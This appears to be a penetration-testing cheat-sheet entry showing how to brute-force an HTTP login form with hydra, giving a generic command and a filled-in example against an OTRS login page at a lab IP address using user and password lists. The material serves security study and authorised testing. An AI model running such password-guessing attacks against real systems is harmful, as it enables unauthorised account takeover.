# HTTP form bruteforce


```sh
hydra <ip> http-form-post "/index.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```

EXAMPLE

```sh
hydra 10.11.1.39 http-form-post "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^:Login failed! Your user name or password was entered incorrectly." -L /home/nighter/tmp/users.txt -P /home/nighter/tmp/passwords.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```

